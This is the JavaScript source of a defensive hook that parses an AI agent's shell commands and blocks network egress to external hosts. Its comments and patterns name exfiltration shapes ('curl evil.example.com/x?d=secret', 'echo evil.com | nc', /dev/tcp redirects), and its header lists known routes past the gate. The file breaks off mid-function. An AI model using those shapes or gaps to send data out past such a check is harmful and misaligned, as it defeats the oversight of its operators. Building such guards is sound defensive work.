#!/usr/bin/env node
// PreToolUse hook (Bash): blocks the NAMED egress shapes the command-name deny list lets through.
// EGRESSPARSER923, owner GO for scope (a) only (2026-09-23).
//
// The deny list (agent-scaffold.ts, BASH_EGRESS_DENY) matches COMMAND NAMES with globs and has no
// negation, so it cannot say "any http EXCEPT localhost". Its own comment names what passes:
// plain-http external fetches, interpreter one-liners (python3 -c, node -e), and a URL hidden in a
// shell variable. This hook closes those shapes, and the common network clients the name list never
// covered, by PARSING the command. COVERED (an external destination denies, localhost and the local
// network pass, a listed vendor host passes):
//   1. argv-read network clients, destinations from the argv with each tool's value-taking flags
//      skipped: curl, wget, aria2c, axel, lynx, w3m, links, elinks, http / https (httpie), xh / xhs,
//      ftp, sftp, tftp, telnet, nc / ncat / netcat, socat (address words), `openssl s_client` /
//      `s_time` (-connect / -host / -proxy). A scheme-less positional counts as a host.
//   2. an interpreter one-liner (python/node/perl/ruby/php/deno/bun with -c/-e/-r/--eval, also
//      combined flags such as -pe) whose code carries an EXTERNAL URL next to a network primitive,
//      and one whose code SPAWNS a process (subprocess, os.system, execSync, system(), backticks):
//      the curl / wget command line or argv list inside it is read the same way as in (1).
//   3. `osascript -e 'do shell script ...'` (URLs and embedded command lines), gawk `/inet/` files,
//      and bash `/dev/tcp/HOST/PORT` / `/dev/udp/...` redirects.
//   4. the commands above when the URL sits in a variable ASSIGNED IN THE SAME COMMAND or a loop
//      variable, behind `bash -c '...'`, `sh -c`, `eval`, a subshell `( )`, a group `{ }`, a background
//      `&`, a shell keyword (if / while / until / do / then), a quoted or escaped command word
//      (`c"ur"l`, `\curl`), or a wrapper with its flags (env, sudo, doas, command, exec, time, nohup,
//      nice, ionice, stdbuf, setsid, caffeinate, unbuffer, watch, timeout DURATION, xargs).
//      xargs reads its arguments from stdin, which cannot be seen: an xargs-fed network client with
//      no literal destination in the command is denied.
//   4b. an alias or function defined in the SAME command line (`alias c=curl; c https://x`,
//      `c(){ curl "$@"; }; c https://x`, `function c { ...; }`, a body in ( ) or a compound command:
//      `c() ( curl "$@" )`, `c() if ...; fi`) is judged as what a call to it expands to; `command` and `builtin` are seen through; a command name held in a variable assigned in the
//      same line is expanded (`${VAR:-default}` and `${VAR-default}` with the default when nothing
//      assigned VAR); a command word that stays unresolved (any `$` left after expansion except a
//      `$HOME/` path, `$(...)`, a backtick) followed by an external-looking URL or host argument is denied
//      (reason `unresolved-command-word`).
//   5. a command that cannot be PARSED (unterminated quote or heredoc) and carries any of the above,
//      or a URL, is denied (fail closed); an unparseable command with nothing network-capable passes.
// localhost / 127.0.0.1 / [::1] ALWAYS pass: the dashboard's own calls (memory, kanban, message
// queue, approvals) go over http://localhost and a gate that cut them would silence the fleet.
// Hosts are cut with a regex, not URL(), so http://localhost:$PORT stays local, while
// localhost.evil.com and localhost@evil.com are external.
//
// PRIVATE NETWORK (maintainer decision on upstream #1611, 2026-09-27): agents may reach private network
// targets from the shell. Local, besides the loopback names above, is decided by the LITERAL host
// string only, never by DNS: a canonical dotted-quad IPv4 in 10/8, 172.16/12, 192.168/16 or 127/8, a
// bracketed IPv6 in fc00::/7 (ULA) or fe80::/10 (link-local), or a name whose LAST label is `local`
// (mDNS, e.g. nas.local). A public name that happens to resolve to a private address stays external
// (nas.example.com), and so does every IPv4 spelling a resolver reads differently from how it looks
// (0x0a.0.0.1, 012.0.0.1, 167772161, 10.1) -- fail closed. 169.254/16 is deliberately NOT local:
// it carries the cloud instance-metadata endpoint. 100.64/10 (CGNAT) is not RFC 1918 and stays
// external. A single-label name (nas, xlocal) is external too: the resolver may complete it through
// a search domain to anywhere.
//
// HOW IT READS THE COMMAND: structure from the MASKED text (maskInertLiterals blanks quoted strings
// and heredoc bodies, length-preserving), so a `curl` or `;` inside a quoted argument or a heredoc
// is not a command; the URL from the ORIGINAL text of the same span.
//
// WHAT THIS DOES NOT CLOSE -- said here so nobody reads "merged" as "closed" (owner/Marveen 29047):
// the name-and-shape list will never be complete. Still OPEN: network calls INSIDE a script file
// (`bash x.sh`, `python3 x.py` -- the hook sees only the outer command); heredoc-fed interpreters
// (`python3 - <<'PY'`, `bash <<EOF`); a URL or command name built at runtime (concatenation, read
// from a file, the environment, a previous command, a curl -K config, a `$(...)` command word, a
// computed `exec(...)` string, `curl $(echo https://x)`); an alias or function defined in an EARLIER
// tool call or in a sourced file (`source x.sh`, `. x.sh`, `export -f`, BASH_ENV, a shell rc file)
// and called here, and any command name the line does not spell or assign; stdin-fed clients other than xargs
// (`echo evil.com | nc`, `-i urls.txt`); other runners (find -exec, parallel, ssh host cmd);
// every other network-capable binary, deliberately NOT denied wholesale because they are everyday
// development tools: git, pip, npm, ssh, scp, rsync, dig, nslookup, ping. A scheme-less argument of
// a text browser is a host unless it exists as a file in the hook's working directory.
// Closing those is an allowlist / network-level gate, not this hook.
//
// FORK DEVIATION from upstream: FAIL-CLOSED on unparseable input or an internal error (exit 2, the
// reason on stderr). The fork's hook policy is fail-closed everywhere; upstream allows and logs.
// Every DENY is appended to the block log.
import { readFileSync, appendFileSync, realpathSync, mkdirSync, existsSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'
import { maskInertLiterals } from '../self-pace-gate.mjs'

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
// FORK: an isolated instance keeps its state under MARVEEN_STORE_DIR (src/config.ts STORE_DIR).
const STORE = process.env.MARVEEN_STORE_DIR || join(ROOT, 'store')
export const BLOCK_LOG = process.env.BASH_EGRESS_BLOCK_LOG || join(STORE, 'bash-egress-blocks.jsonl')
// EGRESSVENDOR925: vendor-API hosts a Bash call may reach (owner decision, per install).
// store/egress-vendor-hosts.json = { "hosts": ["api.elevenlabs.io"] }. EXACT host match only:
// no wildcard, no suffix match, no subdomain inheritance -- `elevenlabs.io.evil.com` and
// `x.api.elevenlabs.io` are other hosts. A missing or unreadable file, or an entry that is not
// a plain DNS name, means no exception: today's behaviour (deny). This is NOT
// store/egress-allowlist.json -- that one is the WebFetch / quarantine-reader list.
export const VENDOR_HOSTS_PATH = process.env.BASH_EGRESS_VENDOR_HOSTS || join(STORE, 'egress-vendor-hosts.json')
// A plain DNS name: labels of [a-z0-9-], no leading/trailing hyphen, at least one dot, a letter TLD.
// Not an IP, not localhost, no `*`, no leading dot, no port, no userinfo.
const VENDOR_HOST = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$/
export function parseVendorHosts(raw) {
  const list = raw && typeof raw === 'object' && Array.isArray(raw.hosts) ? raw.hosts : []
  return new Set(list.filter((h) => typeof h === 'string' && VENDOR_HOST.test(h)))
}
export function loadVendorHosts(path = VENDOR_HOSTS_PATH) {
  try { return parseVendorHosts(JSON.parse(readFileSync(path, 'utf-8'))) } catch { return new Set() }
}
// OPTIONAL, opt-in (upstream #1611, a policy proposal): the same file may also carry
// `"domains": ["example.com"]` -- a listed domain OR any subdomain of it passes. The match is on a
// LABEL boundary: `api.example.com` matches `example.com`, while `evilexample.com`,
// `example.com.evil.net` and `example.com@evil.net` (whose host is evil.net) do not. Entries are
// shape-checked exactly like "hosts" (a plain DNS name: no wildcard, no leading dot, no IP, no
// port, no userinfo), so an IP or `*.x` can never widen the list. A missing key, a malformed
// file, or an entry that is not a plain DNS name adds nothing: today's behaviour. Kept separate
// from "hosts" on purpose, so an existing exact entry never silently becomes a suffix rule.
export function parseVendorDomains(raw) {
  const list = raw && typeof raw === 'object' && Array.isArray(raw.domains) ? raw.domains : []
  return new Set(list.filter((h) => typeof h === 'string' && VENDOR_HOST.test(h)))
}
export function loadVendorDomains(path = VENDOR_HOSTS_PATH) {
  try { return parseVendorDomains(JSON.parse(readFileSync(path, 'utf-8'))) } catch { return new Set() }
}
export function hostInDomains(host, domains) {
  for (const d of domains) if (host === d || host.endsWith(`.${d}`)) return true
  return false
}
const LOCAL_HOSTS = new Set(['localhost', '127.0.0.1', '[::1]', '::1'])
// One-liner URL schemes: every network scheme libcurl speaks (minus file:, and ipfs:/ipns:, which
// resolve through a gateway, not the literal host). A one-liner reaches all of them through a curl
// binding (PHP curl_exec, pycurl) or a stream wrapper (PHP ftps://, Perl LWP gopher://), so an
// http/ftp-only list let `php -r '...curl_init("sftp://host/")...curl_exec(...)'` out untouched.
const URL_RE = /\b(?:https?|ftps?|sftp|scp|tftp|smbs?|dict|gophers?|imaps?|pop3s?|smtps?|ldaps?|telnet|mqtt|rtsp):\/\/[^\s'"`<>\\)]+/gi
const INTERPRETER = /^(?:python(?:\d+(?:\.\d+)?)?|node(?:js)?|perl|ruby|php|deno|bun)$/
const CODE_FLAG = new Set(['-c', '-e', '-E', '-r', '--eval', '-p', '--print', 'eval'])
// Shell keywords that can stand before the real command word of a sub-command. They are here
// because `for p in a b; do curl ...` splits at `;` into a span that starts with `do`, and without
// them a curl inside a loop or an if/then body was never looked at. Commands that WRAP another
// command (env, sudo, timeout, xargs ...) are in WRAPPERS below, with their flags.
const PREFIX_WORDS = new Set(['do', 'then', 'else', 'elif', 'if', 'while', 'until', 'coproc', '{', '(', '!'])
// A one-liner is a DOWNLOADER only when its code uses a network primitive of the language itself.
// Measured on 7 days of fleet commands: a one-liner that merely CARRIES a URL as data (an
// inter-agent message built with subprocess + curl to localhost) must not be denied -- that was 4 of
// 10 would-be blocks. Browser automation (chromium / playwright / puppeteer) is deliberately NOT in
// this list: it is the fleet's mandated browser-verify path on its own domains, and an own-domain
// allowlist is direction (b). Stated as open, measured, and left to the owner.
const NET_PRIMITIVE = /\b(?:urllib|requests\.|http\.client|httplib|httpx|aiohttp|urlopen|socket\.|fetch\s*\(|https?\.(?:get|request)\s*\(|axios|node-fetch|undici|got\s*\(|LWP::|HTTP::Tiny|Net::HTTP|open-uri|IO::Socket|file_get_contents|curl_exec|Invoke-WebRequest)|-M(?:LWP|HTTP::Tiny|IO::Socket|Net::HTTP)/

export function hostOf(url) {
  const m = /^[a-z][a-z0-9+.-]*:\/\/(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/i.exec(url)
  return m ? m[1].toLowerCase() : null
}
// Canonical dotted-quad only: no leading zero, no hex/octal/decimal/short forms.
const OCTET = '(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)'
const CANON_IPV4 = new RegExp(`^${OCTET}(?:\\.${OCTET}){3}$`)
const MDNS_NAME = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+local$/
// A private-network target by its literal spelling (see the PRIVATE NETWORK note in the header).
export function isPrivateTarget(host) {
  const h = String(host ?? '').toLowerCase()
  if (CANON_IPV4.test(h)) {
    const [a, b] = h.split('.').map(Number)
    return a === 10 || a === 127 || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)
  }
  const v6 = /^\[([0-9a-f:.]+)\]$/.exec(h)
  if (v6) return /^f[cd][0-9a-f]{0,2}:/.test(v6[1]) || /^fe[89ab][0-9a-f]?:/.test(v6[1])
  return MDNS_NAME.test(h)
}
export function isLocalHost(host) { return LOCAL_HOSTS.has(host) || isPrivateTarget(host) }
export function isExternal(url) {
  const h = hostOf(url)
  if (h === null || h === '') return false
  return !isLocalHost(h)
}
function spans(masked) {
  const out = []; let start = 0
  // Separators: && || ; | newline, a single & (not &&, >&, &>), a subshell ( ), and a standalone group
  // brace `{` (never the `${` of a parameter expansion or a {a,b} brace expansion).
  const re = /&&|\|\||;|\||\n|(?<![<>])&(?!>)|[()]|(?<!\S)\{(?!\S)/g; let m
  while ((m = re.exec(masked))) { out.push([start, m.index]); start = m.index + m[0].length }
  out.push([start, masked.length])
  return out
}
function words(s) { return s.trim().split(/\s+/).filter(Boolean) }
function collectAssignments(orig, masked) {
  const env = {}
  for (const [a, b] of spans(masked)) {
    const seg = orig.slice(a, b)
    for (const m of seg.matchAll(/(?:^|\s)(?:export\s+|local\s+|readonly\s+)?([A-Za-z_][A-Za-z0-9_]*)=("([^"]*)"|'([^']*)'|([^\s]*))/g)) {
      env[m[1]] = m[3] ?? m[4] ?? m[5] ?? ''
    }
  }
  return env
}
// `for NAME in w1 w2 ...`: the loop variable takes EACH value in turn.
// NAME=value alone never saw it, so `for u in https://x ...; do curl "$u"; done` reached curl with an
// unread destination and passed, while the same URL as a literal or a plain assignment was denied.
// The keyword is found in the MASKED text (a quoted "for u in" is not a loop), the values are read
// from the ORIGINAL text, unquoted, with this command's assignments expanded in them.
function collectLoops(orig, masked, env) {
  const loops = {}
  for (const [a, b] of spans(masked)) {
    const m = /(?:^|[\s(!{])for\s+([A-Za-z_][A-Za-z0-9_]*)\s+in(?=\s|$)/.exec(masked.slice(a, b))
    if (!m) continue
    const vals = shellWords(expand(orig.slice(a + m.index + m[0].length, b), env))
    loops[m[1]] = [...(loops[m[1]] ?? []), ...vals]
  }
  return loops
}
// Every reading of a span a loop can produce: one text per loop value (per combination, for nested
// loops). Past MAX_LOOP_VARIANTS the span is not judged value by value: null, and the caller fails
// closed -- a hand-written URL loop is a few values, never hundreds.
const MAX_LOOP_VARIANTS = 64
// A value goes into the text as ONE word: pasting `'{"a":"b c"}'` raw broke the command's own
// quoting, and its fragments were read as hosts (measured on the fleet's week of commands: a loop
// of JSON bodies posted to localhost with -d "$p" was denied). A URL never holds whitespace or a
// quote, so such a value is replaced by the first URL inside it, or by a neutral word.
function asWord(value) {
  if (/^[^\s'"`\\]+$/.test(value)) return value
  return (String(value).match(URL_RE) ?? [])[0] ?? 'x'
}
function loopVariants(text, env, loops) {
  let out = [text]
  for (const [v, vals] of Object.entries(loops)) {
    const re = new RegExp(`\\$\\{${v}\\}|\\$${v}(?![A-Za-z0-9_])`, 'g')
    if (!re.test(text)) continue
    re.lastIndex = 0
    out = out.flatMap((t) => vals.map((x) => t.replace(re, () => asWord(x))))
    if (out.length > MAX_LOOP_VARIANTS) return null
  }
  return out.map((t) => expand(t, env))
}
function expand(text, env) {
  return text
    // ${VAR:-default} / ${VAR-default} / ${VAR:=default} / ${VAR=default}: the default stands in when
    // nothing assigned VAR here (and, with the colon, when it is empty), so the destination is read.
    .replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)(:?)[-=]([^}]*)\}/g, (all, name, colon, dflt) => {
      const v = env[name]
      return v === undefined || (colon && v === '') ? dflt : v
    })
    .replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g, (all, a, b) => (env[a ?? b] ?? all))
}
// $( ... ) and backtick substitutions are commands of their own: lift them out (length-preserving,
// so offsets still align), classify each inner command separately, and parse the rest without them.
// Without this, every `-H "Authorization: Bearer $(cat token)"` made maskInertLiterals give up:
// measured, 32% of fleet commands were unparseable and would have been allowed blind.
// Quote-aware, with the SAME rules as maskInertLiterals: a substitution is lifted only where the
// shell would run it (top level, inside "...", inside an unquoted-tag heredoc body). Inside '...',
// $'...' and a quoted-tag heredoc body it is inert text. Lifting it there turned every HANDOFF.md
// written with `cat > f <<'EOF'` that mentions a curl in backticks into a false deny.
function substEnd(text, i) { // text[i..] starts with $( -> index just past the matching )
  let depth = 1, j = i + 2, q = null
  while (j < text.length && depth > 0) {
    const c = text[j]
    if (q) { if (c === q) q = null; else if (c === '\\' && q === '"') j++ }
    else if (c === "'" || c === '"') q = c
    else if (c === '(') depth++
    else if (c === ')') depth--
    j++
  }
  return j
}
function backtickEnd(text, i) { // text[i] is ` -> index just past the closing `
  let j = i + 1
  while (j < text.length && text[j] !== '`') j += text[j] === '\\' ? 2 : 1
  return Math.min(j + 1, text.length)
}
export function liftSubstitutions(text, fill = ' ') {
  const inners = []; let out = ''; let i = 0
  // A live substitution at `at` is lifted (blanked, inner kept); returns the next index or -1.
  const lift = (at) => {
    if (text[at] === '$' && text[at + 1] === '(') {
      const j = substEnd(text, at)
      inners.push(text.slice(at + 2, j - 1)); out += fill.repeat(j - at); return j
    }
    if (text[at] === '`') {
      const j = backtickEnd(text, at)
      inners.push(text.slice(at + 1, j - 1)); out += fill.repeat(j - at); return j
    }
    return -1
  }
  // Copy [from, to) in a live context (double quotes, unquoted heredoc body). An escaped \` or \$
  // is literal text here, but maskInertLiterals gives up on ANY backtick or $( inside "...", so it is
  // blanked (length-preserving): measured, 58 of 78 unparseable fleet commands were exactly this
  // (a `gh pr comment --body "... \`code\` ..."`).
  const copyLive = (from, to) => {
    let k = from
    while (k < to) {
      if (text[k] === '\\' && (text[k + 1] === '`' || text[k + 1] === '$')) { out += '  '; k += 2; continue }
      if (text[k] === '\\') { out += text.slice(k, Math.min(k + 2, to)); k += 2; continue }
      const n = lift(k)
      if (n !== -1) { k = n; continue }
      out += text[k]; k++
    }
  }
  while (i < text.length) {
    const c = text[i]
    if (c === '\\' && i + 1 < text.length) { out += text.slice(i, i + 2); i += 2; continue }
    // A here-string (<<<) is not a heredoc, but maskInertLiterals reads `<<<"$s"` as a heredoc
    // tagged `$s` with no body and gives up. The operator carries no URL and no command: blank it,
    // and the word after it is parsed as ordinary (quoted or live) text.
    if (text.startsWith('<<<', i)) { out += '   '; i += 3; continue }
    const here = /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/.exec(text.slice(i))
    if (here) {
      const tag = here[1] ?? here[2] ?? here[3]
      const quotedTag = here[1] != null || here[2] != null
      out += here[0]; i += here[0].length
      const nl = text.indexOf('\n', i)
      if (nl === -1) { copyLive(i, text.length); break }
      // the rest of the heredoc line is ordinary shell text; hand it back to the main loop
      // by processing it recursively, then continue with the body
      const lineRest = liftSubstitutions(text.slice(i, nl + 1), fill)
      out += lineRest.stripped; inners.push(...lineRest.inners); i = nl + 1
      const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
      const rel = endRx.exec(text.slice(i))
      const bodyEnd = rel ? i + rel.index : text.length
      if (quotedTag) out += text.slice(i, bodyEnd); else copyLive(i, bodyEnd)
      i = bodyEnd
      continue
    }
    if (c === "'") {
      const end = text.indexOf("'", i + 1)
      const stop = end === -1 ? text.length : end + 1
      out += text.slice(i, stop); i = stop; continue
    }
    if (c === '$' && text[i + 1] === "'") {
      let j = i + 2
      while (j < text.length && text[j] !== "'") j += text[j] === '\\' ? 2 : 1
      const stop = Math.min(j + 1, text.length)
      out += text.slice(i, stop); i = stop; continue
    }
    if (c === '"') {
      let j = i + 1
      while (j < text.length && text[j] !== '"') {
        if (text[j] === '\\') { j += 2; continue }
        if (text[j] === '$' && text[j + 1] === '(') { j = substEnd(text, j); continue }
        if (text[j] === '`') { j = backtickEnd(text, j); continue }
        j++
      }
      out += '"'
      if (j >= text.length) { copyLive(i + 1, text.length); i = text.length; continue }
      copyLive(i + 1, j); out += '"'; i = j + 1; continue
    }
    const n = lift(i)
    if (n !== -1) { i = n; continue }
    out += c; i++
  }
  return { stripped: out, inners }
}
// curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
// curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
// the host while URL_RE (which needs a scheme) and the name list (`curl *https://*`) both miss it.
// So for curl the argv is read: every positional argument, the --url value, and the proxy / DoH /
// connect-to / resolve values are destinations, and a non-loopback host in any of them denies.
// Flags that take a value are skipped with their value, so `-H "Host: x.y"` or `-o out.html` is
// never read as a destination. An unknown long option is assumed to take no value: if that is
// wrong, its value is read as a destination, which errs toward a deny, never toward a pass.
const CURL_SHORT_WITH_VALUE = new Set('AbcCdDeEFHKmoPQrtTuUwxXyYz'.split(''))
const CURL_LONG_WITH_VALUE = new Set([
  'data', 'data-ascii', 'data-binary', 'data-raw', 'data-urlencode', 'json', 'form', 'form-string',
  'header', 'proxy-header', 'output', 'output-dir', 'request', 'config', 'user', 'proxy-user',
  'user-agent', 'referer', 'cookie', 'cookie-jar', 'dump-header', 'write-out', 'max-time',
  'connect-timeout', 'retry', 'retry-delay', 'retry-max-time', 'range', 'continue-at', 'cert',
  'cert-type', 'key', 'key-type', 'pass', 'cacert', 'capath', 'ciphers', 'interface', 'local-port',
  'limit-rate', 'max-filesize', 'max-redirs', 'noproxy', 'upload-file', 'time-cond', 'trace',
  'trace-ascii', 'stderr', 'unix-socket', 'abstract-unix-socket', 'oauth2-bearer', 'aws-sigv4',
  'expect100-timeout', 'keepalive-time', 'happy-eyeballs-timeout-ms', 'variable', 'url-query',
  'mail-from', 'mail-rcpt', 'mail-auth', 'hostpubmd5', 'hostpubsha256', 'pubkey', 'krb',
  'delegation', 'dns-servers', 'dns-interface', 'dns-ipv4-addr', 'dns-ipv6-addr', 'speed-limit',
  'speed-time', 'tls-max', 'proto', 'proto-redir', 'proto-default', 'etag-save', 'etag-compare',
  'parallel-max', 'create-file-mode', 'ftp-port', 'quote', 'service-name', 'sasl-authzid',
  'login-options', 'netrc-file', 'crlfile', 'engine', 'random-file', 'egd-file', 'socks5-gssapi-service',
  // destination-bearing: read below, still consumed as values
  'url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0',
  'doh-url', 'connect-to', 'resolve',
])
const CURL_DEST_URL = new Set(['url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0', 'doh-url', 'x'])
const CURL_DEST_PARTS = new Set(['connect-to', 'resolve']) // host:port:host:port / host:port:addr
const HOSTNAME = /^(?:localhost|\d{1,3}(?:\.\d{1,3}){3}|\[[0-9a-f:.]+\]|(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,})$/i

// Split a shell text into words, honouring quotes and backslashes (substitutions are already lifted).
export function shellWords(text) {
  const out = []; let cur = null; let i = 0
  const push = () => { if (cur !== null) out.push(cur); cur = null }
  while (i < text.length) {
    const c = text[i]
    if (/\s/.test(c)) { push(); i++; continue }
    cur ??= ''
    if (c === "'") { const e = text.indexOf("'", i + 1); const end = e === -1 ? text.length : e; cur += text.slice(i + 1, end); i = end + 1; continue }
    if (c === '"') {
      let j = i + 1
      while (j < text.length && text[j] !== '"') { if (text[j] === '\\' && j + 1 < text.length) { cur += text[j + 1]; j += 2; continue } cur += text[j]; j++ }
      i = j + 1; continue
    }
    if (c === '\\' && i + 1 < text.length) { cur += text[i + 1]; i += 2; continue }
    cur += c; i++
  }
  push()
  return out
}
// The host of a curl destination, scheme optional; null when the HOST is not a literal hostname
// (an unexpanded $VAR in the host, a glob, a relative path). A variable in the PATH does not hide
// the host: `curl "https://raw.githubusercontent.com/o/r/$p"` in a loop is still a known destination
// (an earlier `value.includes('$')` check let exactly that through). The scheme may be a variable
// too (`$PROTO://host`), so everything up to `://` is dropped.
export function destHost(value) {
  if (!value) return null
  const noScheme = value.replace(/^[^/?#\s]*:\/\//, '')
  const m = /^(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/.exec(noScheme)
  const h = m ? m[1].toLowerCase() : ''
  if (HOSTNAME.test(h)) return h
  // A literal host that is not a regular hostname (single label, 0x0a.0.0.1, 167772161, 10.1) is
  // still a destination curl will resolve; returning null here let it pass unchecked. Fail closed.
  // Only plain literal tokens qualify, so a $VAR, a glob or a relative path still yields null.
  return /^(?=[^.]*[a-z0-9])[a-z0-9][a-z0-9._-]*$/.test(h) ? h : null
}
// ---------------------------------------------------------------------------------------------
// ONE argv reader for every network client the hook judges. Each tool is a small spec on top of the
// curl machinery above: which short letters / long names TAKE a value (skipped, so `wget -O out.txt`
// or `-H "Host: x"` is never read as a destination), which of them carry a destination (proxy, --url),
// and how a positional argument is read. Anything a spec does not list is assumed to take no value:
// if that is wrong its value is read as a destination, which errs toward a deny, never toward a pass.
const letters = (s) => new Set(s.split(''))
const names = (s) => new Set(s.split(/\s+/).filter(Boolean))
const isPort = (w) => /^\d{1,5}(?:-\d{1,5})?$/.test(w) && w.split('-').every((p) => Number(p) <= 65535)
const hostPos = (w) => (isPort(w) ? null : destHost(w)) // `nc host 443`, `telnet host 23`: the port is not a host
const firstPos = (w, st) => (st.n === 0 ? destHost(w) : null) // sftp destination, openssl host:port
// The text browsers open local files too (`w3m -dump page.html`). A scheme-less argument that exists
// as a file where the hook runs is a file; anything else is read as a host (fail closed).
const browserPos = (w) => {
  if (w === '-') return null
  if (!/^[a-z][a-z0-9+.-]*:/i.test(w)) { try { if (existsSync(w)) return null } catch { /* fall through: a host */ } }
  return destHost(w)
}
const HTTP_METHOD = /^(?:get|post|put|patch|delete|head|options|trace|connect)$/i
// httpie / xh: `http [flags] [METHOD] URL [REQUEST_ITEM...]`. The items (a=b, h:v, q==v, f@file) come
// AFTER the URL and are never destinations.
const httpiePos = (w, st) => {
  if (st.done) return null
  if (st.n === 0 && HTTP_METHOD.test(w)) return null
  st.done = true
  return destHost(w)
}
const SPECS = {
  curl: { short: CURL_SHORT_WITH_VALUE, long: CURL_LONG_WITH_VALUE, dest: CURL_DEST_URL, parts: CURL_DEST_PARTS },
  wget: {
    short: letters('OoaePtTwQiBUlIXARDY'),
    long: names(`output-document output-file append-output execute directory-prefix tries timeout dns-timeout
      connect-timeout read-timeout wait waitretry quota input-file base user-agent header post-data post-file
      body-data body-file method referer load-cookies save-cookies user password http-user http-password
      ftp-user ftp-password proxy-user proxy-password limit-rate level include-directories exclude-directories
      accept reject accept-regex reject-regex regex-type domains exclude-domains follow-tags ignore-tags
      bind-address certificate private-key ca-certificate ca-directory crl-file secure-protocol default-page
      local-encoding remote-encoding restrict-file-names backups config bind-dns-address dns-servers
      certificate-type private-key-type egd-file random-file preferred-location warc-file warc-header
      warc-max-size warc-tempdir retry-on-http-error report-speed max-redirect prefer-family hsts-file
      metalink-index input-metalink pinnedpubkey use-askpass`),
    exec: names('e execute'), // -e http_proxy=host:3128
  },
  aria2c: {
    short: letters('dijlsxkmtoUTMOu'),
    long: names(`dir out input-file log max-concurrent-downloads split max-connection-per-server min-split-size
      max-tries retry-wait timeout connect-timeout user-agent header referer load-cookies save-cookies log-level
      conf-path http-user http-passwd ftp-user ftp-passwd checksum max-download-limit max-overall-download-limit
      lowest-speed-limit file-allocation select-file torrent-file metalink-file index-out no-proxy
      all-proxy http-proxy https-proxy ftp-proxy async-dns-server interface`),
    dest: names('all-proxy http-proxy https-proxy ftp-proxy async-dns-server'),
  },
  axel: { short: letters('snoHUT'), long: names('max-speed num-connections output header user-agent timeout') },
  lynx: { short: new Set(), long: new Set(), dashLong: true, pos: browserPos },
  w3m: {
    short: new Set(), dashLong: true, pos: browserPos,
    long: names('T I O o cols ppc ppl config bookmark post header l t'),
    exec: names('o'),
  },
  links: {
    short: new Set(), dashLong: true, pos: browserPos,
    long: names(`width codepage http-proxy ftp-proxy https-proxy socks-proxy download-dir lookup bind-address
      bind-address-ipv6 max-connections retries receive-timeout unrestartable-receive-timeout driver mode display`),
    dest: names('http-proxy ftp-proxy https-proxy socks-proxy lookup'),
  },
  elinks: {
    short: new Set(), dashLong: true, pos: browserPos,
    long: names('remote config-dir default-mime-type eval lookup session-ring verbose dump-width dump-color-mode'),
    dest: names('lookup'),
  },
  httpie: {
    short: letters('aAopPsy'),
    long: names(`auth auth-type output print history-print style pretty format-options verify cert cert-key ssl
      ciphers timeout max-redirects max-headers session session-read-only default-scheme proxy response-charset
      response-mime boundary raw unix-socket path-as-is-no`),
    proxyValue: names('proxy'), // --proxy http:http://host:3128
    pos: httpiePos,
  },
  ftp: { short: letters('NoPrTqu'), long: new Set(), dest: letters('u'), pos: hostPos },
  sftp: {
    short: letters('BbcDFiJlOoPRSs'), long: new Set(), dest: letters('J'), list: letters('J'),
    sshOpt: letters('o'), pos: firstPos,
  },
  tftp: { short: letters('mR'), long: new Set(), stop: new Set(['-c']), pos: hostPos },
  telnet: { short: letters('SXelnbks'), long: new Set(), pos: hostPos },
  nc: {
    short: letters('bgGiIKmMoOpPqsTVwWXx'),
    long: names(`proxy proxy-type proxy-auth source exec sh-exec lua-exec delay wait idle-timeout ssl-cert ssl-key
      ssl-trustfile ssl-ciphers ssl-servername ssl-alpn source-port output hex-dump allow allowfile deny denyfile max-conns`),
    dest: names('x proxy'),
    listen: 'l', listenLong: names('listen'), // a listener is no egress
    pos: hostPos,
  },
  openssl: {
    short: new Set(), dashLong: true, pos: firstPos,
    long: names(`connect host port proxy bind cert key CAfile CApath cipher ciphersuites servername starttls name
      pass alpn nextprotoneg msgfile timeout keylogfile sess_out sess_in psk psk_identity verify verifyCAfile
      verifyCApath cert_chain chainCAfile chainCApath crl_download rev unix xmpphost proto`),
    dest: names('connect host proxy'),
  },
}
const ARGV_TOOLS = new Map([
  ['curl', SPECS.curl], ['wget', SPECS.wget], ['aria2c', SPECS.aria2c], ['axel', SPECS.axel],
  ['lynx', SPECS.lynx], ['w3m', SPECS.w3m], ['links', SPECS.links], ['links2', SPECS.links], ['elinks', SPECS.elinks],
  ['http', SPECS.httpie], ['https', SPECS.httpie], ['xh', SPECS.httpie], ['xhs', SPECS.httpie],
  ['ftp', SPECS.ftp], ['sftp', SPECS.sftp], ['tftp', SPECS.tftp], ['telnet', SPECS.telnet],
  ['nc', SPECS.nc], ['ncat', SPECS.nc], ['netcat', SPECS.nc], ['nc.openbsd', SPECS.nc], ['nc.traditional', SPECS.nc],
])
// Every host in an argv, local or not (the caller filters): [] when the tool is only LISTENING.
export function argvHosts(args, spec) {
  const hosts = []
  const st = { n: 0 }
  const addUrl = (v) => { const h = destHost(v); if (h) hosts.push(h) }
  const addParts = (v) => { for (const p of String(v).split(':')) if (HOSTNAME.test(p)) hosts.push(p.toLowerCase()) }
  const addValue = (name, v) => {
    if (v === undefined) return
    if (spec.dest?.has(name)) { for (const part of spec.list?.has(name) ? String(v).split(',') : [v]) addUrl(part) }
    else if (spec.parts?.has(name)) addParts(v)
